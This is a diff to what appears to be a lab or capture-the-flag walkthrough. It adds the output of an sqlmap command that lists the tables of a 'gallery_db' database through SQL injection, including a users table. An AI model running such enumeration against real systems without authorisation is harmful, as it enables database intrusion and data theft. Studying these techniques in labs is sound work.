@@ -161,3 +161,16 @@ available databases [2]:
 There are two databases, I can now select a database and get all the tables for that database. In my example, I only care about the gallery database. So I run the following command to get all the tables in the `gallery_db` database:
 
 `sqlmap -r request.txt -D gallery_db --tables`
+
+This produces the following output:
+
+```bash
+Database: gallery_db
+[4 tables]
++-------------+
+| album_list  |
+| images      |
+| system_info |
+| users       |
++-------------+
+```
